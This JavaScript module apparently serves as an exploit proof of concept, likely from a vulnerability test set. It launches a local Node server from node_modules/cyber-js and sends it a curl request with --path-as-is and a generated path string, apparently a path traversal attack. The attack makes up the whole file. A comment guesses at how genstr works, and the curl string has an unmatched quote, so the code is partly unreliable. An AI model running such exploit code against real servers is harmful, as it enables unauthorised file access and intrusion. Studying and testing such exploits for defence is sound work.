function exploitFunction(payload) {
    const { genstr } = payload;

    // Simulate starting the server
    let server = "node node_modules/cyber-js/app.js";
    let exe = exec(server, (error, stdout) => {});

    // Craft the attack string using the payload
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:3000${genstr(50)}`; // Assuming genstr takes an argument

    // Execute the attack string
    exec(attack_string, (error, stdout) => {
        if (error) {
            console.error(`Error executing attack: ${error}`);
        } else {
            console.log(`Attack output: ${stdout}`);
        }
    });
}

module.exports = { exploitFunction };